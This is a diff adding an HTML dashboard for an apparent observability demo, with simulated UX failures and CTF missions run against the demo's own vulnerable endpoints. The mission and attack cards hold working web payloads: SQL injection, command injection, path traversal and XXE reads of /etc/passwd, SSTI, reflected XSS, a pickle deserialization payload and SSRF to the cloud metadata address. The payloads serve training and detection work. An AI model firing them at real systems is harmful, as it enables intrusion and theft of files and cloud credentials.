@@ -1,0 +1,476 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Seven Kingdoms OCI Demonstrator</title>
+    
+    <!-- OpenTelemetry Web SDK (for end-to-end tracing Browser -> Backend) -->
+    <script src="https://cdn.jsdelivr.net/npm/@opentelemetry/api@1.4.1/build/src/index.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@opentelemetry/sdk-trace-web@1.15.0/build/src/index.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@opentelemetry/exporter-trace-otlp-http@0.41.1/build/src/index.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@opentelemetry/context-zone@1.15.0/build/src/index.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@opentelemetry/instrumentation@0.41.1/build/src/index.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@opentelemetry/instrumentation-fetch@0.41.1/build/src/index.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@opentelemetry/instrumentation-document-load@0.33.0/build/src/index.js"></script>
+
+    <meta name="generator" content="OCI-DEMO">
+    <link rel="stylesheet" href="/static/seven_kingdoms.css">
+    <!-- OCI APM Browser Agent (RUM) -->
+    <script>
+      window.apmrum = window.apmrum || {};
+      window.apmrum.serviceName = "SevenKingdomsApp";
+      window.apmrum.webApplication = "SevenKingdomsApp";
+      window.apmrum.ociDataUploadEndpoint = "";
+      window.apmrum.OracleAPMPublicDataKey = "";
+    </script>
+  </head>
+  <body>
+    <div class="header">
+      <a href="/" class="nav-back">&larr; Back to Observability Overview</a>
+      <h1>Seven Kingdoms — Application Dashboard</h1>
+      <p>
+        Digital User Experience (UC2) — UX Degradation Simulation & Monitoring
+      </p>
+      <a href="/portal/" style="display:inline-block;margin-top:12px;padding:8px 20px;background:#c9a84c;color:#000;text-decoration:none;border-radius:6px;font-weight:600;font-size:0.9rem">&#9876; Launch Vulnerable Portal (30 CTF Challenges)</a>
+    </div>
+
+    <div class="container">
+      <!-- Live Metrics -->
+      <div class="metrics-bar">
+        <div class="metric-item">
+          <div class="metric-value" id="metric-requests">0</div>
+          <div class="metric-label">Requests</div>
+        </div>
+        <div class="metric-item">
+          <div
+            class="metric-value"
+            id="metric-errors"
+            style="color: var(--error)"
+          >
+            0
+          </div>
+          <div class="metric-label">Errors</div>
+        </div>
+        <div class="metric-item">
+          <div class="metric-value" id="metric-avg-latency">0ms</div>
+          <div class="metric-label">Avg Latency</div>
+        </div>
+        <div class="metric-item">
+          <div
+            class="metric-value"
+            id="metric-apdex"
+            style="color: var(--success)"
+          >
+            1.00
+          </div>
+          <div class="metric-label">Apdex</div>
+        </div>
+      </div>
+
+      <!-- UX Degradation Scenarios -->
+      <div class="section-title">UX Degradation Scenarios</div>
+      <div class="grid">
+        <div class="card" onclick="callEndpoint('/app/slow-query', this)">
+          <span class="badge badge-warning">Warning</span>
+          <span class="card-icon">🐌</span>
+          <h3>Slow Database Query</h3>
+          <p>
+            Simulates a slow DB query (2-30s delay). Generates APM span with
+            duration &gt;5s threshold breach.
+          </p>
+        </div>
+
+        <div class="card" onclick="callEndpoint('/app/error-page', this)">
+          <span class="badge badge-error">Error</span>
+          <span class="card-icon">💥</span>
+          <h3>Application Error (500)</h3>
+          <p>
+            Triggers unhandled NullPointerException. Generates error span +
+            stack trace in logs.
+          </p>
+        </div>
+
+        <div class="card" onclick="callEndpoint('/app/cascade-failure', this)">
+          <span class="badge badge-critical">Critical</span>
+          <span class="card-icon">🔗</span>
+          <h3>Cascade Failure (503)</h3>
+          <p>
+            Upstream payment-service unavailable. Circuit breaker OPEN. Multiple
+            error spans.
+          </p>
+        </div>
+
+        <div class="card" onclick="callEndpoint('/app/hard-load', this)">
+          <span class="badge badge-warning">Warning</span>
+          <span class="card-icon">📦</span>
+          <h3>Heavy Page Load (~1MB)</h3>
+          <p>
+            Returns massive HTML payload. RUM shows LCP &gt;4s, blank screen
+            during render.
+          </p>
+        </div>
+
+        <div class="card" onclick="callEndpoint('/app/timeout', this)">
+          <span class="badge badge-critical">Critical</span>
+          <span class="card-icon">⏱️</span>
+          <h3>Request Timeout (30s+)</h3>
+          <p>
+            Request hangs for 35 seconds. No response span generated (timeout
+            before completion).
+          </p>
+        </div>
+
+        <div class="card" onclick="callEndpoint('/app/memory-pressure', this)">
+          <span class="badge badge-warning">Warning</span>
+          <span class="card-icon">🧠</span>
+          <h3>Memory Pressure / GC Pause</h3>
+          <p>Simulates GC pause (500ms-5s). Heap at 70-95% capacity.</p>
+        </div>
+
+        <div
+          class="card"
+          onclick="callEndpoint('/app/intermittent-error', this)"
+        >
+          <span class="badge badge-error">Error</span>
+          <span class="card-icon">🎲</span>
+          <h3>Intermittent Error (50%)</h3>
+          <p>
+            Random 50% failure rate. Connection reset by peer. Simulates flaky
+            service.
+          </p>
+        </div>
+
+        <div class="card" onclick="callEndpoint('/app/bad-gateway', this)">
+          <span class="badge badge-error">Error</span>
+          <span class="card-icon">🚫</span>
+          <h3>Bad Gateway (502)</h3>
+          <p>
+            Upstream inventory-service returns invalid response. Generates 502
+            error span.
+          </p>
+        </div>
+      </div>
+
+      <!-- Attack Simulation -->
+      <div class="section-title">Security Attack Simulation</div>
+      <div class="grid">
+        <div
+          class="card"
+          onclick="
+            callEndpoint('/api/v1/users/search?q=%27%20OR%201%3D1%20--', this)
+          "
+        >
+          <span class="badge badge-critical">Attack</span>
+          <span class="card-icon">💉</span>
+          <h3>SQL Injection</h3>
+          <p>
+            Sends <code>' OR 1=1 --</code> payload. Generates SQLi detection
+            event + APM error span.
+          </p>
+        </div>
+
+        <div
+          class="card"
+          onclick="
+            callEndpoint('/api/v1/system/diagnostics?cmd=id;whoami', this)
+          "
+        >
+          <span class="badge badge-critical">Attack</span>
+          <span class="card-icon">🐚</span>
+          <h3>Command Injection</h3>
+          <p>
+            Sends <code>id;whoami</code> payload. Generates RCE detection event.
+          </p>
+        </div>
+      </div>
+
+      <!-- CTF Missions -->
+      <div class="section-title">CTF Dashboard / Missions</div>
+      <div class="grid">
+        <div
+          class="card"
+          onclick="callEndpoint('/api/v1/ctf/orders/1002', this)"
+        >
+          <span class="badge badge-error">CTF</span>
+          <span class="card-icon">🕵️</span>
+          <h3>Mission 1: IDOR</h3>
+          <p>
+            Access order ID 1002, which belongs to another user. Check the
+            response for the flag.
+          </p>
+        </div>
+
+        <div
+          class="card"
+          onclick="
+            callEndpoint(
+              '/api/v1/ctf/render?template=../../../../etc/passwd',
+              this,
+            )
+          "
+        >
+          <span class="badge badge-error">CTF</span>
+          <span class="card-icon">📁</span>
+          <h3>Mission 2: LFI</h3>
+          <p>Attempt Local File Inclusion to read <code>/etc/passwd</code>.</p>
+        </div>
+
+        <div
+          class="card"
+          onclick="callEndpoint('/api/v1/ctf/render?template={{7*7}}', this)"
+        >
+          <span class="badge badge-error">CTF</span>
+          <span class="card-icon">⚙️</span>
+          <h3>Mission 3: SSTI</h3>
+          <p>
+            Perform Server-Side Template Injection with
+            <code>{{7*7}}</code> payload.
+          </p>
+        </div>
+
+        <div
+          class="card"
+          onclick="
+            callEndpoint(
+              '/api/v1/ctf/search?query=%3Cscript%3Ealert(1)%3C/script%3E',
+              this,
+            )
+          "
+        >
+          <span class="badge badge-error">CTF</span>
+          <span class="card-icon">👾</span>
+          <h3>Mission 4: XSS</h3>
+          <p>Execute Reflected XSS payload via search endpoint.</p>
+        </div>
+
+        <div class="card" onclick="callApiWithPayload('/api/v1/ctf/xml_upload', 'POST', '<?xml version=\'1.0\' encoding=\'ISO-8859-1\'?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \'file:///etc/passwd\' >]><foo>&xxe;</foo>', this)">
+            <span class="badge badge-error">CTF</span>
+            <span class="card-icon">🔖</span>
+            <h3>Mission 5: XXE</h3>
+            <p>Exploit XML parser to read <code>/etc/passwd</code> via External Entity injection.</p>
+        </div>
+
+        <div class="card" onclick="callEndpoint('/api/v1/ctf/import_profile?payload=gASVNwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBdlY2hvIEZMQUdfSU5KRUNURUQg>IC90bXAvcS50eHRIhZRSlC4=', this)">
+            <span class="badge badge-error">CTF</span>
+            <span class="card-icon">🧩</span>
+            <h3>Mission 6: Insecure Deserialization</h3>
+            <p>Submit malicious base64-encoded Python pickle payload for Remote Code Execution.</p>
+        </div>
+
+        <div class="card" onclick="callEndpoint('/api/v1/got/wildlings?name=Tormund%27%20UNION%20SELECT%20flag%20FROM%20secrets--', this)">
+            <span class="badge badge-error">CTF (GOAD)</span>
+            <span class="card-icon">🐺</span>
+            <h3>Mission 7: The Wall (SQLi)</h3>
+            <p>Extract flags from Castelblack MSSQL database using UNION-based injection.</p>
+        </div>
+
+        <div class="card" onclick="callEndpoint('/api/v1/got/dragons?url=http://169.254.169.254/opc/v2/instance/', this)">
+            <span class="badge badge-error">CTF (GOAD)</span>
+            <span class="card-icon">🐉</span>
+            <h3>Mission 8: Dragon Eggs (SSRF)</h3>
+            <p>Fetch internal metadata bypassing network perimeter defenses.</p>
+        </div>
+      </div>
+
+      <!-- Result Panel -->
+      <div id="result-panel">
+        <h3>Response <span id="result-status"></span></h3>
+        <div>
+          <span class="status-indicator" id="result-indicator"></span>
+          <span id="result-latency"></span>
+        </div>
+        <pre id="result-content"></pre>
+      </div>
+    </div>
+
+    <script>
+      let totalRequests = 0;
+      let totalErrors = 0;
+      let latencies = [];
+
+      async function callEndpoint(url, cardEl) {
+        const panel = document.getElementById("result-panel");
+        const content = document.getElementById("result-content");
+        const status = document.getElementById("result-status");
+        const latency = document.getElementById("result-latency");
+        const indicator = document.getElementById("result-indicator");
+
+        cardEl.classList.add("loading");
+        panel.classList.add("visible");
+        content.textContent = "Loading...";
+
+        const start = performance.now();
+        totalRequests++;
+        document.getElementById("metric-requests").textContent = totalRequests;
+
+        try {
+          const resp = await fetch(url);
+          const elapsed = Math.round(performance.now() - start);
+          latencies.push(elapsed);
+
+          const text = await resp.text();
+          let formatted;
+          try {
+            formatted = JSON.stringify(JSON.parse(text), null, 2);
+          } catch {
+            formatted =
+              text.substring(0, 2000) +
+              (text.length > 2000 ? "\n... (truncated)" : "");
+          }
+
+          status.textContent = `HTTP ${resp.status}`;
+          latency.textContent = `${elapsed}ms`;
+          content.textContent = formatted;
+
+          if (resp.ok) {
+            indicator.className = "status-indicator status-ok";
+          } else {
+            indicator.className = "status-indicator status-err";
+            totalErrors++;
+          }
+        } catch (err) {
+          const elapsed = Math.round(performance.now() - start);
+          latencies.push(elapsed);
+          status.textContent = "FAILED";
+          latency.textContent = `${elapsed}ms (timeout/error)`;
+          content.textContent = err.message;
+          indicator.className = "status-indicator status-err";
+          totalErrors++;
+        }
+
+        cardEl.classList.remove("loading");
+        document.getElementById("metric-errors").textContent = totalErrors;
+
+        const avgLat = Math.round(
+          latencies.reduce((a, b) => a + b, 0) / latencies.length,
+        );
+        document.getElementById("metric-avg-latency").textContent =
+          `${avgLat}ms`;
+
+        // Simple Apdex: satisfied < 2000ms, tolerating < 8000ms
+        const satisfied = latencies.filter((l) => l < 2000).length;
+        const tolerating = latencies.filter(
+          (l) => l >= 2000 && l < 8000,
+        ).length;
+        const apdex = ((satisfied + tolerating * 0.5) / latencies.length).toFixed(2);
+        document.getElementById('metric-apdex').textContent = apdex;
+        document.getElementById('metric-apdex').style.color =
+            apdex >= 0.9 ? 'var(--success)' : apdex >= 0.7 ? 'var(--warning)' : 'var(--error)';
+      }
+
+      async function callApiWithPayload(url, method, payload, cardEl) {
+          const panel = document.getElementById('result-panel');
+          const content = document.getElementById('result-content');
+          const status = document.getElementById('result-status');
+          const latency = document.getElementById('result-latency');
+          const indicator = document.getElementById('result-indicator');
+
+          cardEl.classList.add('loading');
+          panel.classList.add('visible');
+          content.textContent = 'Loading...';
+
+          const start = performance.now();
+          totalRequests++;
+          document.getElementById('metric-requests').textContent = totalRequests;
+
+          try {
+              const resp = await fetch(url, {
+                  method: method,
+                  headers: { 'Content-Type': 'application/xml' },
+                  body: payload
+              });
+              const elapsed = Math.round(performance.now() - start);
+              latencies.push(elapsed);
+
+              const text = await resp.text();
+              let formatted;
+              try {
+                  formatted = JSON.stringify(JSON.parse(text), null, 2);
+              } catch {
+                  formatted = text.substring(0, 2000) + (text.length > 2000 ? '\n... (truncated)' : '');
+              }
+
+              status.textContent = `HTTP ${resp.status}`;
+              latency.textContent = `${elapsed}ms`;
+              content.textContent = formatted;
+
+              if (resp.ok) {
+                  indicator.className = 'status-indicator status-ok';
+              } else {
+                  indicator.className = 'status-indicator status-err';
+                  totalErrors++;
+              }
+          } catch (err) {
+              const elapsed = Math.round(performance.now() - start);
+              latencies.push(elapsed);
+              status.textContent = 'FAILED';
+              latency.textContent = `${elapsed}ms (timeout/error)`;
+              content.textContent = err.message;
+              indicator.className = 'status-indicator status-err';
+              totalErrors++;
+          }
+
+          cardEl.classList.remove('loading');
+          document.getElementById('metric-errors').textContent = totalErrors;
+      }
+
+      // Configure RUM agent with APM endpoint from meta tag or environment
+      const apmEndpoint =
+        document
+          .querySelector('meta[name="apm-endpoint"]')
+          ?.getAttribute("content") || "";
+      const apmPublicKey =
+        document
+          .querySelector('meta[name="apm-public-key"]')
+          ?.getAttribute("content") || "";
+
+      if (apmEndpoint && apmPublicKey) {
+        window.ociDataUploadEndpoint = apmEndpoint;
+        window.OracleAPMPublicDataKey = apmPublicKey;
+
+        const script = document.createElement("script");
+        script.src = `${apmEndpoint}/static/jslib/apmrum.min.js`;
+        script.crossOrigin = "anonymous";
+        document.head.appendChild(script);
+        
+        // OpenTelemetry Web SDK initialization for true traceparent propagation
+        try {
+            if (window.opentelemetry) {
+                const { WebTracerProvider } = window.opentelemetry.sdkTraceWeb;
+                const { OTLPTraceExporter } = window.opentelemetry.exporterTraceOtlpHttp;
+                const { BatchSpanProcessor } = window.opentelemetry.sdkTraceBase || window.opentelemetry.sdkTraceWeb;
+                const { ZoneContextManager } = window.opentelemetry.contextZone;
+                const { registerInstrumentations } = window.opentelemetry.instrumentation;
+                const { FetchInstrumentation } = window.opentelemetry.instrumentationFetch;
+
+                const provider = new WebTracerProvider();
+                
+                // Route traces to OCI APM
+                const otlpEndpoint = apmEndpoint.replace(/\/$/, '') + '/20200101/observations/public-span?dataFormat=otlp&dataFormatVersion=1.0&dataKey=' + apmPublicKey;
+                const exporter = new OTLPTraceExporter({ url: otlpEndpoint });
+                
+                provider.addSpanProcessor(new BatchSpanProcessor(exporter));
+                provider.register({
+                    contextManager: new ZoneContextManager()
+                });
+
+                registerInstrumentations({
+                    instrumentations: [
+                        new FetchInstrumentation({
+                            propagateTraceHeaderCorsUrls: [
+                                new RegExp('.*') 
+                            ],
+                            clearTimingResources: true,
+                        }),
+                    ],
+                });
+                console.log("OpenTelemetry Web SDK loaded and instrumenting fetch requests.");
+            }
+        } catch (e) {
+            console.warn("OpenTelemetry SDK initialization failed:", e);
+        }
+      }
+    </script>
+  </body>
+</html>
